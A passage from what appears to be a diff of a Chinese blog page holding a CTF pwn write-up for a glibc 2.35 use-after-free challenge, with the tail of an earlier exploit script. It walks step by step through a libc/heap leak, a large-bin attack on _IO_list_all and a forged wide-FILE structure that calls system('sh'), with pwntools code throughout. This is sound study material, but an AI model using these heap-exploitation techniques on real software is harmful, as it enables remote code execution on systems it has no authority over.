class="line">edit(0x100,b&quot;a&quot;*0x38+p64(0xfa1))</span><br><span class="line">add(0x1000,b&quot;aaa&quot;)</span><br><span class="line">add(0x400,b&quot;11111111&quot;)</span><br><span class="line"># dbg()</span><br><span class="line">show(2)</span><br><span class="line">ru(b&quot;Name of house : &quot;)</span><br><span class="line">libc_base=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3c5188</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">edit(0x10,b&quot;a&quot;*0x10)</span><br><span class="line">show(2)</span><br><span class="line">ru(b&quot;a&quot;*0x10)</span><br><span class="line">heap_base= u64(p.recv(6).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(hex(heap_base))</span><br><span class="line">io_list_all=libc_base+libc.sym[&quot;_IO_list_all&quot;]</span><br><span class="line"># dbg()</span><br><span class="line"></span><br><span class="line">payload =  flat(p64(0) * 3,</span><br><span class="line">                p64(libc_base + libc.sym[&quot;system&quot;]),#overflow</span><br><span class="line">                0x400 * b&quot;\x00&quot;,</span><br><span class="line">                b&quot;/bin/sh\x00&quot;, </span><br><span class="line">                0x61,#new_top_chunk——size</span><br><span class="line">                0, </span><br><span class="line">                io_list_all-0x10,#bk-&gt;main_arena</span><br><span class="line">                0,    # _IO_write_base</span><br><span class="line">                0x1,  # _IO_write_ptr</span><br><span class="line">                0xa8 * b&quot;\x00&quot;,</span><br><span class="line">                heap_base+0x10#vtable</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">edit(0x600,payload)</span><br><span class="line"># dbg()</span><br><span class="line">sla(b&quot;Your choice : &quot;,str(1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -627,39 +714,84 @@
 
 <p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17203" >参考了这位师傅关于2024litctf  2.35  pwn的分析<i class="fas fa-external-link-alt"></i></a></p>
 <p>题目是2.35的，只有uaf漏洞</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305164343790.png"  alt="image-20260305164343790"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305164343790.png"
+                        alt="image-20260305164343790"
+                 ></p>
 <h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>首先就是泄露libc</p>
 <p>free一个大的chunk2,不进入tcache,进入unsorted bin，然后再malloc一个比它大的chunk4，让chunk2进入large bin,通过它的fd和fd_nextsize拿到libc和heap地址</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(8, 0x18)</span><br><span class="line">add(0, 0x510)</span><br><span class="line">add(1, 0x30)  # 0x20的话chunk2的地址是00结尾，printf没法泄露，所以要0x30</span><br><span class="line">add(2, 0x520)</span><br><span class="line">add(3, 0x30)</span><br><span class="line">delete(2)</span><br><span class="line">add(4, 0x530)</span><br><span class="line">show(2)</span><br><span class="line">#dbg()</span><br><span class="line">large = u64(r.recv(6).ljust(8, b&#x27;\0&#x27;))  # 其实是main_arena+0x490</span><br><span class="line">libcbase = large - 0x670 - libc.sym[&#x27;_IO_2_1_stdin_&#x27;]</span><br><span class="line">_IO_list_all = libcbase + libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line">system = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">success(&#x27;libcbase: &#x27; + hex(libcbase))</span><br><span class="line">edit(2, b&#x27;A&#x27; * 0x10)</span><br><span class="line">show(2)</span><br><span class="line">r.recv(0x10)</span><br><span class="line">heap = u64(r.recv(6).ljust(8, b&#x27;\0&#x27;))</span><br><span class="line">success(&#x27;heap: &#x27; + hex(heap))</span><br></pre></td></tr></table></figure>
 
 <p>如果large bin中只有一个chunk,fd_nextsize和bk_nextsize会指向它本身</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305164824746.png"  alt="image-20260305164824746"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305164824746.png"
+                        alt="image-20260305164824746"
+                 ></p>
 <p>然后打large_bin攻击，把_IO_lsit_all挪到chunk0上面</p>
 <p>先free出一个大的chunk放在unsorted bin中，然后改large bin的bk_nextsize为_IO_list_all - 0x20</p>
 <p>打victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">delete(0)</span><br><span class="line"># dbg()</span><br><span class="line">edit(2, p64(0)*3+ p64(_IO_list_all - 0x20))</span><br><span class="line">add(5, 0x550)</span><br><span class="line"># dbg()</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305165716818.png"  alt="image-20260305165716818"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305165716818.png"
+                        alt="image-20260305165716818"
+                 ></p>
 <p>malloc之后</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305165821601.png"  alt="image-20260305165821601"></p>
-<h3 id="构造io结构"><a href="#构造io结构" class="headerlink" title="构造io结构"></a>构造io结构</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305170041136.png"  alt="image-20260305170041136"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305165821601.png"
+                        alt="image-20260305165821601"
+                 ></p>
+<h3 id="构造io结构"><a href="#构造io结构" class="headerlink" title="构造io结构"></a>构造io结构</h3><p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305170041136.png"
+                        alt="image-20260305170041136"
+                 ></p>
 <h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>_<em>doallocate会以io_file里面的变量为参数，需要把</em><strong>flags改成binsh，同时flags还要满足f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) &#x3D;&#x3D; 0</strong>的条件,由于刚好对应的是chunk0的pre_size位，通过chunk8来布置</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0 = heap - 0x560  # chunk0的chunk地址     add(0, 0x510)</span><br><span class="line">edit(8, b&#x27;A&#x27; * 0x10 + p32(0xfffff7f5) + b&#x27;;sh\x00&#x27;)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/PixPin_2026-03-05_17-06-06.png"  alt="PixPin_2026-03-05_17-06-06"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/PixPin_2026-03-05_17-06-06.png"
+                        alt="PixPin_2026-03-05_17-06-06"
+                 ></p>
 <h4 id="IO-write-ptr-base"><a href="#IO-write-ptr-base" class="headerlink" title="_IO_write_ptr&#x2F;base"></a>_IO_write_ptr&#x2F;base</h4><p><strong>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake = p64(0)*2 + p64(1) + p64(2)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305170827712.png"  alt="image-20260305170827712"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305170827712.png"
+                        alt="image-20260305170827712"
+                 ></p>
 <h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p><strong>fp-&gt;_mode &lt;&#x3D; 0</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake = fake.ljust(0xc0 - 0x10, b&#x27;\0&#x27;) + p64(0xffffffffffffffff)  # _mode 0xc0</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305171343660.png"  alt="image-20260305171343660"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305171343660.png"
+                        alt="image-20260305171343660"
+                 ></p>
 <h4 id="vtable"><a href="#vtable" class="headerlink" title="vtable"></a>vtable</h4><p><strong>fp-&gt;vtable &#x3D; IO_wfile_jumps</strong></p>
 <p>让 <code>_IO_OVERFLOW(fp)</code> 这种宏&#x2F;调用最终走到 <strong>宽字符的 overflow 实现</strong>（即 <code>_IO_wfile_overflow</code>），而不是普通的 <code>_IO_file_overflow</code>。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake = fake.ljust(0xd8 - 0x10, b&#x27;\0&#x27;) + p64(io_wfile_jumps)  # vtable 0xd8</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305171717712.png"  alt="image-20260305171717712"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305171717712.png"
+                        alt="image-20260305171717712"
+                 ></p>
 <h4 id="wide-data"><a href="#wide-data" class="headerlink" title="wide_data"></a>wide_data</h4><ul>
 <li><code>fp-&gt;vtable</code>指向 <code>_IO_wfile_jumps</code>决定 <strong>走哪套函数实现</strong>（宽文件 or 窄文件）</li>
 <li>进入宽文件实现（例如 <code>_IO_wfile_overflow</code>）后，会大量读写 <code>fp-&gt;_wide_data</code>，并且会通过 <code>fp-&gt;_wide_data-&gt;_wide_vtable</code> 再跳一次（第二层 vtable）</li>
@@ -677,9 +809,19 @@
 <p>要把fp-&gt;wide_data-&gt;_wide_vtable劫持成chunk0里面一个我们可控的区域。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake = fake.ljust(0x100 - 0x10 + 0xe0, b&#x27;\0&#x27;) + p64(chunk0 + 0x200)#_wide_vtablem 0xe0</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305173830991.png"  alt="image-20260305173830991"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305173830991.png"
+                        alt="image-20260305173830991"
+                 ></p>
 <p>chunk_addr + 0x200的位置就不错，0xe0为_wide_vtable在_wide_data里面的偏移。</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305172937873.png"  alt="image-20260305172937873"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260305172937873.png"
+                        alt="image-20260305172937873"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    0x200 - 0x10, b&#x27;\0&#x27;) + p64(0)*13 + p64(system)</span><br></pre></td></tr></table></figure>
 
 <p>把__doallocate 覆盖成system，其余_wide_vtable里面的变量覆盖成0就好了。</p>
@@ -709,8 +851,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -901,6 +1079,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -1003,6 +1194,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -1042,8 +1262,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -1068,6 +1296,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
